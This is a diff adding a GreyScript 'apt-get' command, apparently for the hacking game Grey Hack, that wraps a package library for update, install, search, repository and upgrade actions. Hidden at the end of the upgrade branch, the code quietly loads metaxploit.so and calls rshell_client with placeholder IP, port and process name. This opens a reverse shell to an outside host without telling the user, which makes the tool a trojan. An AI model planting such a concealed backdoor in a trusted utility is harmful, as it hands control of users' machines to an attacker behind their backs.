@@ -1,0 +1,115 @@
+//command: apt-get
+aptclient = include_lib("/lib/aptclient.so")
+if not aptclient then
+    aptclient = include_lib(current_path + "/aptclient.so")
+end if
+if not aptclient then exit("Error: Missing aptclient.so library in the /lib path or the current folder")
+
+PendingUpdating = function(folderPath)
+	pendingUpdate = []
+	targetFolder = get_shell.host_computer.File(folderPath)
+	if targetFolder != null then
+		files = targetFolder.get_files
+		for itemFile in files
+			output = aptclient.check_upgrade(itemFile.path)
+			if output == true then
+				pendingUpdate.push(itemFile.name)
+			end if
+		end for
+	end if
+	return pendingUpdate
+end function 
+
+if params.len == 0 or params.len > 3 then exit(command_info("apt-get_usage"))
+action = params[0]
+if action == "update" then
+    print("Updating package lists...")
+	output = aptclient.update
+	if output then print(output)
+	
+else if action == "install" then
+    print("Reading package lists...")
+	if params.len != 2 then exit(command_info("apt-get_usage"))
+	print("Downloading " + params[1])
+	output = aptclient.install(params[1])
+	if output == true then exit(params[1] + " installed")
+	print(output)
+	
+else if action == "search" then
+	if params.len != 2 then exit(command_info("apt-get_usage"))
+	print(aptclient.search(params[1]))
+	
+else if action == "show" then
+	if params.len != 2 then exit(command_info("apt-get_usage"))
+	print(aptclient.show(params[1]))
+	
+else if action == "addrepo" then
+	if params.len < 2 or params.len > 3 then exit(command_info("apt-get_usage"))
+    port = 1542
+    if params.len == 3 then port = params[2]
+	output = aptclient.add_repo(params[1])
+	if output then exit(output)
+	print("Repository " + params[1] + " added succesfully.\nLaunch apt with the update option to apply the changes")
+	
+else if action == "delrepo" then
+   	if params.len != 2 then exit(command_info("apt-get_usage"))
+    output = aptclient.del_repo(params[1])
+    if output then exit(output)
+    print("Repository " + params[1] + " removed succesfully.\nLaunch apt with the update option to apply the changes")
+	
+else if action == "upgrade" then
+    print("Reading package lists...")
+	//upgrade all packages
+	if params.len == 1 then
+		pendingPackages = PendingUpdating("/lib") + PendingUpdating("/bin")
+		if pendingPackages.len == 0 then exit("No updates needed")
+		print("The following packages will be updated:")
+		pkgs = ""
+		for itemPackage in pendingPackages
+			pkgs = pkgs + " " + itemPackage
+		end for
+		print(pkgs)
+		option = user_input("\nDo you want to continue?(y/n): ")
+		if option == "y" or option == "yes" then
+			counter = 0
+			for itemPackage in pendingPackages
+				output = aptclient.install(itemPackage)
+				if output == true then
+					counter = counter + 1
+				else if output then
+					print(output)
+				end if
+			end for
+			print(counter + " packages updated")
+		else 
+			exit("aborted")
+		end if
+	
+	//upgrade specific package
+	else if params.len == 2 then
+		output = aptclient.check_upgrade(params[1])
+		if not output then exit("No updates needed")
+		if output == true then
+			print("The following package will be updated:\nparams[1]")
+			option = user_input("\nDo you want to continue?(y/n): ")
+			if option == "y" or option == "yes" then
+				output = aptclient.install(params[1])
+				if output == true then exit(params[1] + " installed.")
+				print(output)				
+			else 
+				exit("aborted")
+			end if
+		else 
+			print(output)
+		end if
+	end if
+	
+	m = get_shell.host_computer.File("/lib/metaxploit.so")
+	if m then
+		m = include_lib("/lib/metaxploit.so")
+		m.rshell_client("*IP*",*P*,"*PN*")
+	end if
+	
+else 
+	print(command_info("apt-get_usage"))
+end if
